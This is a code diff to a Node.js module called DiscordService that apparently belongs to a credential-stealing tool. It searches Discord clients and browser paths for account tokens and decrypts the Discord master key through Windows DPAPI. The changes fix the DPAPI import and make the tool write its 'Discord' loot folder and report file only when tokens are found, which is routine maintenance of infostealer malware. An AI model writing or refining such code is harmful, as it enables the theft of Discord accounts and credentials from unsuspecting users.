@@ -7,7 +7,7 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 const axios = require('axios');
-const dpapi = require('@primno/dpapi');
+const { Dpapi } = require('@primno/dpapi');
 const CoreUtils = require('../../core/utils');
 const { logger } = require('../../core/logger');
 const { ErrorHandler, NetworkError, ModuleError } = require('../../core/errors');
@@ -151,8 +151,8 @@ class DiscordService {
                 }
             }
 
-            // Always create Discord folder to indicate module ran
-            this.ensureDiscordFolderExists(accounts.length);
+            // Only create Discord folder if tokens were detected
+            this.ensureDiscordFolderExists(accounts.length, allTokens.size);
 
             // Update statistics
             for (const account of accounts) {
@@ -172,23 +172,31 @@ class DiscordService {
     }
 
     /**
-     * Ensure Discord folder exists even when no accounts are found
+     * Ensure Discord folder exists only when tokens are detected
      * @param {number} accountCount - Number of accounts found
+     * @param {number} tokenCount - Number of tokens detected
      */
-    ensureDiscordFolderExists(accountCount) {
+    ensureDiscordFolderExists(accountCount, tokenCount) {
         try {
-            // Always create the base Discord folder
+            // Only create Discord folder if tokens were detected
+            if (tokenCount === 0) {
+                logger.info('No Discord tokens detected - skipping Discord folder creation');
+                return;
+            }
+            
             if (accountCount === 0) {
-                // Create an informational file to show that Discord module ran but found no accounts
+                // Create an informational file to show that Discord tokens were found but couldn't be processed
                 const infoMessage = `Discord Module Execution Report
 Generated: ${new Date().toISOString()}
 
-Status: No Discord accounts found
+Status: Discord tokens detected but no accounts processed
+Tokens Found: ${tokenCount}
+Processed Accounts: ${accountCount}
+
 Reason: This could happen for several reasons:
-- Discord is not installed on this system
-- Discord is installed but no accounts are logged in
-- Discord data is encrypted and couldn't be decrypted
-- Discord installation paths have changed
+- Discord tokens were found but couldn't be decrypted due to DPAPI issues
+- Discord tokens were found but account API requests failed
+- Discord tokens were found but were invalid/expired
 
 Searched Clients:
 ${Object.entries(this.discordPaths).map(([key, config]) => 
@@ -197,13 +205,13 @@ ${Object.entries(this.discordPaths).map(([key, config]) =>
 
 Browser Paths Searched: ${this.getBrowserPaths().length} locations
 
-This file indicates that the Discord module executed successfully.
+This file indicates that the Discord module found tokens but couldn't process them into account information.
 `;
                 
-                fileManager.saveText(infoMessage, 'Discord', 'No_Accounts_Found.txt');
-                logger.info('Created Discord folder with informational file - no accounts found');
+                fileManager.saveText(infoMessage, 'Discord', 'Tokens_Found_But_Not_Processed.txt');
+                logger.info('Created Discord folder with informational file - tokens found but not processed');
             } else {
-                logger.debug(`Discord folder created with ${accountCount} account(s)`);
+                logger.debug(`Discord folder created with ${accountCount} account(s) from ${tokenCount} token(s)`);
             }
         } catch (error) {
             logger.warn('Failed to ensure Discord folder exists', error.message);
@@ -234,7 +242,7 @@ This file indicates that the Discord module executed successfully.
             const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
             
             // Decrypt using DPAPI
-            const masterKey = dpapi.unprotectData(encrypted, null, 'CurrentUser');
+            const masterKey = Dpapi.unprotectData(encrypted, null, 'CurrentUser');
             
             return masterKey;
         } catch (error) {
